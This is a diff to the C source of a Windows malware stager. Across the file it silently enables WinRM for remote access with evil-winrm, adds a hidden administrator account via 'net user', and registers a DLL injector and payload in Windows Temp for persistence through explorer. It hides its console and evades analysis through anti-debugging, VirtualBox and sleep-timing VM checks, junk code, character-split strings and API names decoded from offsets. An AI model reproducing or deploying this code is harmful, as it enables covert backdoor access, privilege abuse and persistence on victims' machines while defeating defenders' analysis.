@@ -9,13 +9,12 @@
 #include <wchar.h> 
 #include <wininet.h>
 
-
-
 //Add dead code
-//Add checkers to see if the registery keys are modified and services are created
-//Make the web server only requestable by CURL user agent (refer to nginx config)
+//maybe try making the web server only requestable by CURL user agent (refer to nginx config)
+//Enable WinRM for monitoring with evil-winrm
 
-//mt.exe -manifest app.manifest -outputresource:.\stager.exe
+//mt.exe -manifest app.manifest -outputresource:.\stage_zero.exe
+
 
 NTSTATUS STATUS;
 unsigned char magic[160000];
@@ -126,93 +125,65 @@ HANDLE m_stuff(NtOpenMutant NT_OpenMutant, NtCreateMutant NT_CreateMutant,HANDLE
 	return hMux;
 }
 
-/*
-BOOL nf12(LPCWSTR filepath,
-			FARPROC h_11_p_open_func,
-			FARPROC h_11_p_conn_func,
-			FARPROC h_11_p_open_req_func,
-			FARPROC h_11_p_send_func,
-			FARPROC h_11_p_recv_func,
-			FARPROC h_11_p_query_func,
-			FARPROC h_11_p_read_func,
-			FARPROC h_11_p_close_func)
-{
-	HINTERNET hSession = h_11_p_open_func(NULL,WINHTTP_ACCESS_TYPE_NO_PROXY,WINHTTP_NO_PROXY_NAME,WINHTTP_NO_PROXY_BYPASS,0);
-	if (!hSession ){
-		printf("[x] WinHttpOpen FAILED %lu\n",GetLastError());
-		return 1;
-	}
-	printf("[+] WinHttpOpen DONE\n");
-	
-	HINTERNET hConnect = h_11_p_conn_func(hSession,L"192.168.100.13",8000,0);
-	if ( !hConnect ){
-		printf("[x] WinHttpConnect FAILED, %lu\n",GetLastError());
-		return 1;
-		
-	}
-	printf("[+] WinHttpConnect DONE\n");
-	
-	wprintf(L"%s\n",filepath);
-	HINTERNET hRequest = h_11_p_open_req_func(hConnect,L"GET",filepath,NULL,WINHTTP_NO_REFERER,WINHTTP_DEFAULT_ACCEPT_TYPES,0);
-	if ( !hRequest ){
-		printf("[x] WinHttpOpenRequest FAILED %lu\n",GetLastError());
-		return 1;
-	}
-	
-	printf("[+] WinHttpOpenRequest DONE\n");
-	
-	
-	BOOL bValue;
-	do{
-		
-		bValue = h_11_p_send_func(hRequest,WINHTTP_NO_ADDITIONAL_HEADERS,0,WINHTTP_NO_REQUEST_DATA,0,0,0);
-		
-	} while (bValue == FALSE);
-	printf("[+] WinHttpSendRequest DONE\n");
 
+int w1n_Rm(){
 	
+	char full_string_1[30];	// winrm quickconfig -quiet
+	char part_string_1_1[] = "w";
+	char part_string_1_2[] = "i";
+	char part_string_1_3[] = "n";
+	char part_string_1_4[] = "r";
+	char part_string_1_5[] = "m ";
+	char part_string_1_6[] = "q";
+	char part_string_1_7[] = "u";
+	char part_string_1_8[] = "i";
+	char part_string_1_9[] = "c";
+	char part_string_1_10[] = "k";
+	char part_string_1_11[] = "c";
+	char part_string_1_12[] = "o";
+	char part_string_1_13[] = "n";
+	char part_string_1_14[] = "f";
+	char part_string_1_15[] = "i";
+	char part_string_1_16[] = "g";
+	char part_string_1_17[] = " -";
+	char part_string_1_18[] = "q";
+	char part_string_1_19[] = "u";
+	char part_string_1_20[] = "i";
+	char part_string_1_21[] = "e";
+	char part_string_1_22[] = "t";
+	strcpy(full_string_1, part_string_1_1);
+	strcat(full_string_1, part_string_1_2);
+	strcat(full_string_1, part_string_1_3);
+	strcat(full_string_1, part_string_1_4);
+	strcat(full_string_1, part_string_1_5);
+	strcat(full_string_1, part_string_1_6);
+	strcat(full_string_1, part_string_1_7);
+	strcat(full_string_1, part_string_1_8);
+	strcat(full_string_1, part_string_1_9);
+	strcat(full_string_1, part_string_1_10);
+	strcat(full_string_1, part_string_1_11);
+	strcat(full_string_1, part_string_1_12);
+	strcat(full_string_1, part_string_1_13);
+	strcat(full_string_1, part_string_1_14);
+	strcat(full_string_1, part_string_1_15);
+	strcat(full_string_1, part_string_1_16);
+	strcat(full_string_1, part_string_1_17);
+	strcat(full_string_1, part_string_1_18);
+	strcat(full_string_1, part_string_1_19);
+	strcat(full_string_1, part_string_1_20);
+	strcat(full_string_1, part_string_1_21);
+	strcat(full_string_1, part_string_1_22);
 	
-	if ( h_11_p_recv_func(hRequest,NULL) == FALSE ){
-		printf("[x] WinHttpReceiveResponse FAILED %lu\n",GetLastError());
+	int result = system(full_string_1);
+	if (result == 0) {
+        //printf("[+] WINRM ENABLED, cmd -> %s\n",full_string_1);
+		return 0;
+    } else {
+        //printf("[x] Couldn't Enable WINRM, cmd -> %s\n",full_string_1);
 		return 1;
-	}
-	printf("[+] WinHttpReceiveResponse DONE\n");
-
-	DWORD dwSize = 0;
-    if (!h_11_p_query_func(hRequest, &dwSize)) {
-        printf("[x] WinHttpQueryDataAvailable FAILED %lu\n", GetLastError());
-        return 1;
     }
-	printf("[+] WinHttpQueryDataAvailable DONE\n");
-	ZeroMemory(magic, sizeof(magic));
-	DWORD dwDownloaded = 0;
-	printf("[+] BEFORE WinHttpReadData\n");
-    if (!h_11_p_read_func(hRequest, (LPVOID)magic, dwSize, &dwDownloaded)) {
-        printf("[x] WinHttpReadData FAILED %lu\n", GetLastError());
-        return 1;
-    }
-
-	printf("[+] WinHttpReadData DONE\n");
 	
-	
-	printf("[+] File content: \n%s\n", magic);
-	
-	for (int i = 0; i < sizeof(magic); i++) {
-	printf("\\x%02x ", magic[i]);
-	}
-	
-	printf("\n");
-	
-	
-	
-	
-    h_11_p_close_func(hRequest);
-    h_11_p_close_func(hConnect);
-    h_11_p_close_func(hSession);
 }
-*/
-
-
 
 BOOL dw_ff1e1(const char *url, const char *output_path,FARPROC n3t_op3n_func,FARPROC n3t_op3n_ur1_func,FARPROC n3t_r3ad_f1l3_func,FARPROC n3t_cl0s3_hndl3_func) {
     HINTERNET hInternet = n3t_op3n_func("af21_ff1e1", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
@@ -305,14 +276,14 @@ int ff_131mva(FARPROC open_key_reg_func,FARPROC set_key_reg_func,FARPROC close_k
 	strcat(full_string_1, part_1_22);
 	
 	
-	char full_string_2[154];	//	explorer.exe,\"C:\\Windows\\Temp\\SSS_ce1aaa99ce4bdb0101000000984b2414aa\\dll_injector.exe\" \"C:\\Windows\\Temp\\SSS_ce1aaa99ce4bdb0101000000984b2414aa\\legit.dll\"
+	char full_string_2[154];	//	explorer.exe,"C:\Windows\Temp\SSS_ce1aaa99ce4bdb0101000000984b2414aa\dll_injector.exe" "C:\Windows\Temp\SSS_ce1aaa99ce4bdb0101000000984b2414aa\legit.dll"
 	char part_2_1[] = "ex";	
 	char part_2_2[] = "pl";
 	char part_2_3[] = "or";
 	char part_2_4[] = "er.";
 	char part_2_5[] = "ex";
-	char part_2_6[] = "e,\"";
-	char part_2_7[] = "C";
+	char part_2_6[] = "e, ";
+	char part_2_7[] = "\"C";
 	char part_2_8[] = ":\\";
 	char part_2_9[] = "Win";
 	char part_2_10[] = "do";
@@ -342,7 +313,7 @@ int ff_131mva(FARPROC open_key_reg_func,FARPROC set_key_reg_func,FARPROC close_k
 	char part_2_34[] = "e";
 	char part_2_35[] = "xe";
 	char part_2_36[] = "\" \"C";	
-	char part_2_37[] = "\\:";
+	char part_2_37[] = ":\\";
 	char part_2_38[] = "Win";
 	char part_2_39[] = "do";
 	char part_2_40[] = "ws\\T";
@@ -748,7 +719,7 @@ void en_R_6_P(	FARPROC open_key_reg_func,
 	char part_4_2[] = "Y";
 	char part_4_3[] = "S";
 	char part_4_4[] = "T";
-	char part_4_5[] = "Y";
+	char part_4_5[] = "E";
 	char part_4_6[] = "M";
 	char part_4_7[] = "\\";
 	char part_4_8[] = "C";
@@ -1334,7 +1305,7 @@ void a66_Uz3_r(FARPROC cr_key_reg_func,FARPROC set_key_reg_func,FARPROC close_ke
 	char part_1_6[] = "_us";
 	char part_1_7[] = "er p";
 	char part_1_8[] = "wn";
-	char part_1_9[] = "ed";
+	char part_1_9[] = "ed ";
 	char part_1_10[] = "/a";
 	char part_1_11[] = "d";
 	char part_1_12[] = "d &";
@@ -1349,8 +1320,8 @@ void a66_Uz3_r(FARPROC cr_key_reg_func,FARPROC set_key_reg_func,FARPROC close_ke
 	char part_1_21[] = "A";
 	char part_1_22[] = "d";
 	char part_1_23[] = "mi";
-	char part_1_24[] = "ns";
-	char part_1_25[] = "tr";
+	char part_1_24[] = "ni";
+	char part_1_25[] = "str";
 	char part_1_26[] = "at";
 	char part_1_27[] = "or";
 	char part_1_28[] = "s s";
@@ -1396,8 +1367,15 @@ void a66_Uz3_r(FARPROC cr_key_reg_func,FARPROC set_key_reg_func,FARPROC close_ke
 	strcat(full_string_1, part_1_33);
 	strcat(full_string_1, part_1_34);
 	strcat(full_string_1, part_1_35);
-	system(full_string_1);
 	
+	
+	if (system(full_string_1) != 0){
+		
+		//printf("[x] Couldn't add new user, CMD -> %s\n",full_string_1);
+		return;
+	}
+
+	//printf("[+] Added sys_user successfully\n");
 	char full_string_2[70];	
 	char part_2_1[] = "s";
 	char part_2_2[] = "y";
@@ -1934,9 +1912,9 @@ void Vn_in(){
 	
 	int result = system(full_string_1);
 	if (result == 0) {
-        //printf("VNC installed.\n");
+        //printf("[+] VNC installed!\n");
     } else {
-        //printf("VNC hasn't installed.\n");
+        //printf("[x] VNC hasn't installed.\n");
     }
 	
 	
@@ -1948,31 +1926,387 @@ void Chk_DBG(){
 	if (pPEB->BeingDebugged != 0 || pPEB->NtGlobalFlag != 0){
 		//printf("[x] PROGRAM IS BEING DEBUGGED, EXITING!\n");
 		//MessageBoxA(NULL, "[x] PROGRAM IS BEING DEBUGGED, EXITING!", "Title", MB_OK);
+		
+		
 		// CALL DEAD CODE TO EXECUTE
-		exit(1);	//Debug
+		//to show in main graph flow
+		int x = 0;
+		x += 1;
+		x -= 1;
+		x *= 2;
+		x /= 2;
+
+		// Additional complex math operations
+		double y = 2.5;
+		double z = 3.7;
+		double result = 0.0;
+
+		// Perform math operations
+		result = sqrt(pow(y, 2) + pow(z, 2)); 
+		result = sin(result);
+		result = cos(result); 
+		result = tan(result); 
+
+		// Use the result to perform more operations
+		for (int i = 0; i < 10; ++i) {
+			result *= i;
+			result /= (i + 1);
+			result += i;
+		}
+
+		// Use the final result to perform some conditional operations
+		if (result > 100) {
+		result -= 124213;
+		} 
+		else {
+		result += 2134;
+		}
+		
+		exit(0);	//Debug
 	}
 	//printf("[+] NO DEBUGGER PRESENT, CONTINUING!\n");
 	//MessageBoxA(NULL, "[+] NO DEBUGGER PRESENT, CONTINUING!", "Title", MB_OK);
 	
 	//RETURN AND START THE MALWARE
-	//exit(0);	//Debug
 	return;
 }
 
+
+void Chk_VM(NtDelayExecution NT_DelayExecution){
+	
+	// artifacts to check
+	//add string splitting
+	//LPCSTR path1 = "C:\\windows\\system32\\drivers\\VBoxMouse.sys";
+	//LPCSTR path2 = "C:\\windows\\system32\\drivers\\VBoxGuest.sys";
+	//LPCSTR path3 = "C:\\Windows\\System32\\vmGuestLib.dll";
+	
+	char full_string_1[100];	// C:\\windows\\system32\\drivers\\VBoxMouse.sys
+	char part_string_1_1[] = "C";
+	char part_string_1_2[] = ":";
+	char part_string_1_3[] = "\\w";
+	char part_string_1_4[] = "i";
+	char part_string_1_5[] = "n";
+	char part_string_1_6[] = "d";
+	char part_string_1_7[] = "o";
+	char part_string_1_8[] = "w";
+	char part_string_1_9[] = "s\\";
+	char part_string_1_10[] = "s";
+	char part_string_1_11[] = "y";
+	char part_string_1_12[] = "s";
+	char part_string_1_13[] = "te";
+	char part_string_1_14[] = "m";
+	char part_string_1_15[] = "3";
+	char part_string_1_16[] = "2";
+	char part_string_1_17[] = "\\d";
+	char part_string_1_18[] = "r";
+	char part_string_1_19[] = "i";
+	char part_string_1_20[] = "v";
+	char part_string_1_21[] = "e";
+	char part_string_1_22[] = "r";
+	char part_string_1_23[] = "s";
+	char part_string_1_24[] = "\\";
+	char part_string_1_25[] = "V";
+	char part_string_1_26[] = "B";
+	char part_string_1_27[] = "o";
+	char part_string_1_28[] = "x";
+	char part_string_1_29[] = "M";
+	char part_string_1_30[] = "o";
+	char part_string_1_31[] = "u";
+	char part_string_1_32[] = "s";
+	char part_string_1_33[] = "e";
+	char part_string_1_34[] = ".";
+	char part_string_1_35[] = "s";
+	char part_string_1_36[] = "y";
+	char part_string_1_37[] = "s";
+	strcpy(full_string_1, part_string_1_1);
+	strcat(full_string_1, part_string_1_2);
+	strcat(full_string_1, part_string_1_3);
+	strcat(full_string_1, part_string_1_4);
+	strcat(full_string_1, part_string_1_5);
+	strcat(full_string_1, part_string_1_6);
+	strcat(full_string_1, part_string_1_7);
+	strcat(full_string_1, part_string_1_8);
+	strcat(full_string_1, part_string_1_9);
+	strcat(full_string_1, part_string_1_10);
+	strcat(full_string_1, part_string_1_11);
+	strcat(full_string_1, part_string_1_12);
+	strcat(full_string_1, part_string_1_13);
+	strcat(full_string_1, part_string_1_14);
+	strcat(full_string_1, part_string_1_15);
+	strcat(full_string_1, part_string_1_16);
+	strcat(full_string_1, part_string_1_17);
+	strcat(full_string_1, part_string_1_18);
+	strcat(full_string_1, part_string_1_19);
+	strcat(full_string_1, part_string_1_20);
+	strcat(full_string_1, part_string_1_21);
+	strcat(full_string_1, part_string_1_22);
+	strcat(full_string_1, part_string_1_23);
+	strcat(full_string_1, part_string_1_24);
+	strcat(full_string_1, part_string_1_25);
+	strcat(full_string_1, part_string_1_26);
+	strcat(full_string_1, part_string_1_27);
+	strcat(full_string_1, part_string_1_28);
+	strcat(full_string_1, part_string_1_29);
+	strcat(full_string_1, part_string_1_30);
+	strcat(full_string_1, part_string_1_31);
+	strcat(full_string_1, part_string_1_32);
+	strcat(full_string_1, part_string_1_33);
+	strcat(full_string_1, part_string_1_34);
+	strcat(full_string_1, part_string_1_35);
+	strcat(full_string_1, part_string_1_36);
+	strcat(full_string_1, part_string_1_37);
+	char full_string_2[100];	// C:\\windows\\system32\\drivers\\VBoxGuest.sys
+	char part_string_2_1[] = "C";
+	char part_string_2_2[] = ":";
+	char part_string_2_3[] = "\\w";
+	char part_string_2_4[] = "i";
+	char part_string_2_5[] = "n";
+	char part_string_2_6[] = "d";
+	char part_string_2_7[] = "o";
+	char part_string_2_8[] = "w";
+	char part_string_2_9[] = "s\\";
+	char part_string_2_10[] = "s";
+	char part_string_2_11[] = "y";
+	char part_string_2_12[] = "s";
+	char part_string_2_13[] = "te";
+	char part_string_2_14[] = "m";
+	char part_string_2_15[] = "3";
+	char part_string_2_16[] = "2";
+	char part_string_2_17[] = "\\d";
+	char part_string_2_18[] = "r";
+	char part_string_2_19[] = "i";
+	char part_string_2_20[] = "v";
+	char part_string_2_21[] = "e";
+	char part_string_2_22[] = "r";
+	char part_string_2_23[] = "s";
+	char part_string_2_24[] = "\\";
+	char part_string_2_25[] = "V";
+	char part_string_2_26[] = "B";
+	char part_string_2_27[] = "o";
+	char part_string_2_28[] = "x";
+	char part_string_2_29[] = "G";
+	char part_string_2_30[] = "u";
+	char part_string_2_31[] = "e";
+	char part_string_2_32[] = "s";
+	char part_string_2_33[] = "t";
+	char part_string_2_34[] = ".";
+	char part_string_2_35[] = "s";
+	char part_string_2_36[] = "y";
+	char part_string_2_37[] = "s";
+	strcpy(full_string_2, part_string_2_1);
+	strcat(full_string_2, part_string_2_2);
+	strcat(full_string_2, part_string_2_3);
+	strcat(full_string_2, part_string_2_4);
+	strcat(full_string_2, part_string_2_5);
+	strcat(full_string_2, part_string_2_6);
+	strcat(full_string_2, part_string_2_7);
+	strcat(full_string_2, part_string_2_8);
+	strcat(full_string_2, part_string_2_9);
+	strcat(full_string_2, part_string_2_10);
+	strcat(full_string_2, part_string_2_11);
+	strcat(full_string_2, part_string_2_12);
+	strcat(full_string_2, part_string_2_13);
+	strcat(full_string_2, part_string_2_14);
+	strcat(full_string_2, part_string_2_15);
+	strcat(full_string_2, part_string_2_16);
+	strcat(full_string_2, part_string_2_17);
+	strcat(full_string_2, part_string_2_18);
+	strcat(full_string_2, part_string_2_19);
+	strcat(full_string_2, part_string_2_20);
+	strcat(full_string_2, part_string_2_21);
+	strcat(full_string_2, part_string_2_22);
+	strcat(full_string_2, part_string_2_23);
+	strcat(full_string_2, part_string_2_24);
+	strcat(full_string_2, part_string_2_25);
+	strcat(full_string_2, part_string_2_26);
+	strcat(full_string_2, part_string_2_27);
+	strcat(full_string_2, part_string_2_28);
+	strcat(full_string_2, part_string_2_29);
+	strcat(full_string_2, part_string_2_30);
+	strcat(full_string_2, part_string_2_31);
+	strcat(full_string_2, part_string_2_32);
+	strcat(full_string_2, part_string_2_33);
+	strcat(full_string_2, part_string_2_34);
+	strcat(full_string_2, part_string_2_35);
+	strcat(full_string_2, part_string_2_36);
+	strcat(full_string_2, part_string_2_37);
+	char full_string_3[100];	// C:\\Windows\\System32\\vmGuestLib.dll
+	char part_string_3_1[] = "C";
+	char part_string_3_2[] = ":";
+	char part_string_3_3[] = "\\w";
+	char part_string_3_4[] = "i";
+	char part_string_3_5[] = "n";
+	char part_string_3_6[] = "d";
+	char part_string_3_7[] = "o";
+	char part_string_3_8[] = "w";
+	char part_string_3_9[] = "s\\";
+	char part_string_3_10[] = "s";
+	char part_string_3_11[] = "y";
+	char part_string_3_12[] = "s";
+	char part_string_3_13[] = "te";
+	char part_string_3_14[] = "m";
+	char part_string_3_15[] = "3";
+	char part_string_3_16[] = "2";
+	char part_string_3_17[] = "\\";
+	char part_string_3_18[] = "v";
+	char part_string_3_19[] = "m";
+	char part_string_3_20[] = "G";
+	char part_string_3_21[] = "u";
+	char part_string_3_22[] = "e";
+	char part_string_3_23[] = "s";
+	char part_string_3_24[] = "t";
+	char part_string_3_25[] = "l";
+	char part_string_3_26[] = "i";
+	char part_string_3_27[] = "b";
+	char part_string_3_28[] = ".";
+	char part_string_3_29[] = "d";
+	char part_string_3_30[] = "l";
+	char part_string_3_31[] = "l";
+	char part_string_3_32[] = "";
+	char part_string_3_33[] = "";
+	char part_string_3_34[] = "";
+	char part_string_3_35[] = "";
+	char part_string_3_36[] = "";
+	char part_string_3_37[] = "";
+	strcpy(full_string_3, part_string_3_1);
+	strcat(full_string_3, part_string_3_2);
+	strcat(full_string_3, part_string_3_3);
+	strcat(full_string_3, part_string_3_4);
+	strcat(full_string_3, part_string_3_5);
+	strcat(full_string_3, part_string_3_6);
+	strcat(full_string_3, part_string_3_7);
+	strcat(full_string_3, part_string_3_8);
+	strcat(full_string_3, part_string_3_9);
+	strcat(full_string_3, part_string_3_10);
+	strcat(full_string_3, part_string_3_11);
+	strcat(full_string_3, part_string_3_12);
+	strcat(full_string_3, part_string_3_13);
+	strcat(full_string_3, part_string_3_14);
+	strcat(full_string_3, part_string_3_15);
+	strcat(full_string_3, part_string_3_16);
+	strcat(full_string_3, part_string_3_17);
+	strcat(full_string_3, part_string_3_18);
+	strcat(full_string_3, part_string_3_19);
+	strcat(full_string_3, part_string_3_20);
+	strcat(full_string_3, part_string_3_21);
+	strcat(full_string_3, part_string_3_22);
+	strcat(full_string_3, part_string_3_23);
+	strcat(full_string_3, part_string_3_24);
+	strcat(full_string_3, part_string_3_25);
+	strcat(full_string_3, part_string_3_26);
+	strcat(full_string_3, part_string_3_27);
+	strcat(full_string_3, part_string_3_28);
+	strcat(full_string_3, part_string_3_29);
+	strcat(full_string_3, part_string_3_30);
+	strcat(full_string_3, part_string_3_31);
+	strcat(full_string_3, part_string_3_32);
+	strcat(full_string_3, part_string_3_33);
+	strcat(full_string_3, part_string_3_34);
+	strcat(full_string_3, part_string_3_35);
+	strcat(full_string_3, part_string_3_36);
+	strcat(full_string_3, part_string_3_37);
+	
+	DWORD attributes1 = GetFileAttributes(full_string_1);
+	DWORD attributes2 = GetFileAttributes(full_string_2);
+	DWORD attributes3 = GetFileAttributes(full_string_3);
+	// Check if both files exist
+	if ( (attributes1 != INVALID_FILE_ATTRIBUTES && !(attributes1 & FILE_ATTRIBUTE_DIRECTORY)) || (attributes2 != INVALID_FILE_ATTRIBUTES && !(attributes2 & FILE_ATTRIBUTE_DIRECTORY)) || (attributes3 != INVALID_FILE_ATTRIBUTES && !(attributes3 & FILE_ATTRIBUTE_DIRECTORY)) ) {
+	// At least one of the files exists
+	//printf("[+] THIS IS A VM\n!");
+	exit(1);
+	}
+
+
+	LARGE_INTEGER sleepInterval;
+	sleepInterval.QuadPart = -600000000; //1 minute (60 seconds) -> 60000 milliseconds
+	//printf("[+] BEGIN SLEEP\n");
+	
+	
+	// Get the system uptime before sleeping
+	ULONG64 uptimeBeforeSleep = GetTickCount64();
+
+	// Initiate Delay
+	NT_DelayExecution(FALSE, &sleepInterval);
+
+	// Get the system uptime after sleeping
+	ULONG64 uptimeAfterSleep = GetTickCount64();
+
+	// Calculate the actual sleep time in milliseconds
+	ULONG64 actualSleepTime = uptimeAfterSleep - uptimeBeforeSleep;
+	
+	//printf("Actual sleep time: %llu milliseconds\n", actualSleepTime);
+
+	// Check if the actual sleep time is close to the expected sleep time
+	if (actualSleepTime >= 60000) {	// if time_slept >= 60 seconds
+	return;
+	} 
+	else {
+	//printf("[+] THIS IS A VM\n!");
+	exit(1);
+	}
+	
+}
+
+BOOL Chk_VM_cmp(HKEY rootKey, char* subKeyName, char* registryValue, char* comparisonValue, FARPROC open_key_reg_func, FARPROC query_key_reg_func) {
+	HKEY hKEY = NULL;
+	LONG result;
+	char value[1024];
+	DWORD size = sizeof(value);
+	result = open_key_reg_func(rootKey, subKeyName, 0, KEY_READ, &hKEY);
+	if (result == ERROR_SUCCESS) {
+		RegQueryValueExA(hKEY, registryValue, NULL, NULL, (LPBYTE)value, &size);
+		if (result == ERROR_SUCCESS) {
+			if (strcmp(value, comparisonValue) == 0) {
+			return TRUE;
+			}
+		}
+	}
+	else{
+		//printf("[x] Couldn't Query Registry Key, ERR -> %d\n", result);
+	}
+	return FALSE;
+}
+
+
+BOOL Chk_VM_substr(HKEY rootKey, char* subKeyName, char* registryValue, char* comparisonValue, FARPROC open_key_reg_func, FARPROC query_key_reg_func) {
+	HKEY hKEY = NULL;
+	LONG result;
+	char value[1024];
+	DWORD size = sizeof(value);
+	result = open_key_reg_func(rootKey, subKeyName, 0, KEY_READ, &hKEY);
+	if (result == ERROR_SUCCESS) {
+		RegQueryValueExA(hKEY, registryValue, NULL, NULL, (LPBYTE)value, &size);
+		if (result == ERROR_SUCCESS) {
+			if (strstr(value, comparisonValue) != NULL) {
+				return TRUE;
+			}
+		}
+	else{
+		//printf("[x] Couldn't Query Registry Key, ERR -> %d\n", result);
+	}
+	}
+	
+	return FALSE;
+}
+
+
 int main(){
 	
-	
+
+    //Get the console window handle
+    HWND consoleWindow = GetConsoleWindow();
+    
+    //Hide the window
+    ShowWindow(consoleWindow, SW_HIDE);	
 	
 	Chk_DBG();
-	//Chk_VM();
 	
-	//GetTickCount64();
-	
+
 	
 	// --- START OFFSETS --- //
-	int create_snap_offset[] = {28,17,4,0,19,4,45,14,14,11,7,4,11,15,55,54,44,13,0,15,18,7,14,19};	//CreateToolhelp32Snapshot 
-	int proc_first_offset[] = {41,17,14,2,4,18,18,55,54,31,8,17,18,19};				//Process32First
-	int proc_next_offset[] = {41,17,14,2,4,18,18,55,54,39,4,23,19};					//Process32Next
+	//int create_snap_offset[] = {28,17,4,0,19,4,45,14,14,11,7,4,11,15,55,54,44,13,0,15,18,7,14,19};	//CreateToolhelp32Snapshot 
+	//int proc_first_offset[] = {41,17,14,2,4,18,18,55,54,31,8,17,18,19};				//Process32First
+	//int proc_next_offset[] = {41,17,14,2,4,18,18,55,54,39,4,23,19};					//Process32Next
 	int dll_k_er_32_offset[] = {10,4,17,13,4,11,55,54,62,3,11,11};
 	int dll_n__t_offset[] = {39,45,29,37,37};
 	int dll_a_DV_offset[] = {0,3,21,0,15,8,55,54,62,3,11,11};
@@ -1988,6 +2322,8 @@ int main(){
 	int set_key_reg_offset[] = {43,4,6,44,4,19,47,0,11,20,4,30,23,26};				//RegSetValueExA
 	int cr_key_reg_offset[] = {43,4,6,28,17,4,0,19,4,36,4,24,26};					//RegCreateKeyA
 	int close_key_reg_offset[] = {43,4,6,28,11,14,18,4,36,4,24};					//RegCloseKey
+	int query_key_reg_offset[] = {43,4,6,42,20,4,17,24,47,0,11,20,4,30,23,26};					//RegQueryValueExA
+	/*
 	int h_11_p_open_offset[] = {48,8,13,33,19,19,15,40,15,4,13};					//WinHttpOpen
 	int h_11_p_conn_offset[] = {48,8,13,33,19,19,15,28,14,13,13,4,2,19};				//WinHttpConnect
 	int h_11_p_open_req_offset[] = {48,8,13,33,19,19,15,40,15,4,13,43,4,16,20,4,18,19};	//WinHttpOpenRequest
@@ -1996,7 +2332,8 @@ int main(){
 	int h_11_p_query_offset[] = {48,8,13,33,19,19,15,42,20,4,17,24,29,0,19,0,26,21,0,8,11,0,1,11,4}; //WinHttpQueryDataAvailable
 	int h_11_p_read_offset[] = {48,8,13,33,19,19,15,43,4,0,3,29,0,19,0}; //WinHttpReadData
 	int h_11_p_close_offset[] = {48,8,13,33,19,19,15,28,11,14,18,4,33,0,13,3,11,4}; //WinHttpCloseHandle
-	int wr_dmp_offset[] = {38,8,13,8,29,20,12,15,48,17,8,19,4,29,20,12,15}; //MiniDumpWriteDump
+	*/
+	//int wr_dmp_offset[] = {38,8,13,8,29,20,12,15,48,17,8,19,4,29,20,12,15}; //MiniDumpWriteDump
 	int open_SC_offset[] = {40,15,4,13,44,28,38,0,13,0,6,4,17,26};	//OpenSCManagerA
 	int open_service_offset[] = {40,15,4,13,44,4,17,21,8,2,4,26};	//OpenServiceA
 	int start_service_offset[] = {44,19,0,17,19,44,4,17,21,8,2,4,26};	//StartServiceA
@@ -2189,7 +2526,7 @@ int main(){
 	
 	// --- START FUNCTION PROTOTYPES INIT --- //
 	//printf("[+] populating prototypes...\n");
-	//NtOpenProcess NT_OpenProcess = (NtOpenProcess)GetProcAddress(hDLL_n__t, "NtOpenProcess"); 
+	NtOpenProcess NT_OpenProcess = (NtOpenProcess)GetProcAddress(hDLL_n__t, "NtOpenProcess"); 
 	//NtCreateProcessEx NT_CreateProcessEx = (NtCreateProcessEx)GetProcAddress(hDLL_n__t,"NtCreateProcessEx");
 	//NtCreateThreadEx NT_CreateThreadEx = (NtCreateThreadEx)GetProcAddress(hDLL_n__t, "NtCreateThreadEx"); 
 	NtClose NT_Close = (NtClose)GetProcAddress(hDLL_n__t, full_func_1);
@@ -2213,7 +2550,9 @@ int main(){
 	FARPROC open_key_reg_func = GetProcAddress(hdll_a_DV,GetOriginal(open_key_reg_offset,ALL_ALPHANUM,sizeof(open_key_reg_offset)));
 	FARPROC set_key_reg_func = GetProcAddress(hdll_a_DV,GetOriginal(set_key_reg_offset,ALL_ALPHANUM,sizeof(set_key_reg_offset)));
 	FARPROC cr_key_reg_func = GetProcAddress(hdll_a_DV,GetOriginal(cr_key_reg_offset,ALL_ALPHANUM,sizeof(cr_key_reg_offset)));
+	FARPROC query_key_reg_func = GetProcAddress(hdll_a_DV,GetOriginal(query_key_reg_offset,ALL_ALPHANUM,sizeof(query_key_reg_offset)));
 	FARPROC close_key_reg_func = GetProcAddress(hdll_a_DV,GetOriginal(close_key_reg_offset,ALL_ALPHANUM,sizeof(close_key_reg_offset)));
+	/*
 	FARPROC	h_11_p_open_func = GetProcAddress(hdll_H_11_P,GetOriginal(h_11_p_open_offset,ALL_ALPHANUM,sizeof(h_11_p_open_offset)));	//WinHttpOpen
 	FARPROC h_11_p_conn_func = GetProcAddress(hdll_H_11_P,GetOriginal(h_11_p_conn_offset,ALL_ALPHANUM,sizeof(h_11_p_conn_offset)));	//WinHttpConnect
 	FARPROC h_11_p_open_req_func = GetProcAddress(hdll_H_11_P,GetOriginal(h_11_p_open_req_offset,ALL_ALPHANUM,sizeof(h_11_p_open_req_offset)));	//WinHttpOpenRequest
@@ -2222,7 +2561,7 @@ int main(){
 	FARPROC h_11_p_query_func = GetProcAddress(hdll_H_11_P,GetOriginal(h_11_p_query_offset,ALL_ALPHANUM,sizeof(h_11_p_query_offset))); //WinHttpQueryDataAvailable
 	FARPROC h_11_p_read_func = GetProcAddress(hdll_H_11_P,GetOriginal(h_11_p_read_offset,ALL_ALPHANUM,sizeof(h_11_p_read_offset))); //WinHttpReadData
 	FARPROC h_11_p_close_func = GetProcAddress(hdll_H_11_P,GetOriginal(h_11_p_close_offset,ALL_ALPHANUM,sizeof(h_11_p_close_offset))); //WinHttpCloseHandle
-	
+	*/
 	FARPROC n3t_op3n_func = GetProcAddress(hdll_inet,GetOriginal(n3t_op3n_offset,ALL_ALPHANUM,sizeof(n3t_op3n_offset))); //InternetOpenA
 	FARPROC n3t_op3n_ur1_func = GetProcAddress(hdll_inet,GetOriginal(n3t_op3n_ur1_offset,ALL_ALPHANUM,sizeof(n3t_op3n_ur1_offset))); //InternetOpenUrlA
 	FARPROC n3t_r3ad_f1l3_func = GetProcAddress(hdll_inet,GetOriginal(n3t_r3ad_f1l3_offset,ALL_ALPHANUM,sizeof(n3t_r3ad_f1l3_offset))); //InternetReadFile
@@ -2238,7 +2577,406 @@ int main(){
 	// --- END FUNCTION PROTOTYPES INIT --- //
 	
 	
+	
+	
+	// --- START ANTI-VM --- //
+	// string splitting and function signatures to the function
+	char full_string_key_1[100];	// SYSTEM\\CurrentControlSet\\Control\\SystemInformation
+	char part_string_key_1_1[] = "S";
+	char part_string_key_1_2[] = "Y";
+	char part_string_key_1_3[] = "S";
+	char part_string_key_1_4[] = "T";
+	char part_string_key_1_5[] = "E";
+	char part_string_key_1_6[] = "M";
+	char part_string_key_1_7[] = "\\";
+	char part_string_key_1_8[] = "C";
+	char part_string_key_1_9[] = "u";
+	char part_string_key_1_10[] = "r";
+	char part_string_key_1_11[] = "r";
+	char part_string_key_1_12[] = "e";
+	char part_string_key_1_13[] = "n";
+	char part_string_key_1_14[] = "t";
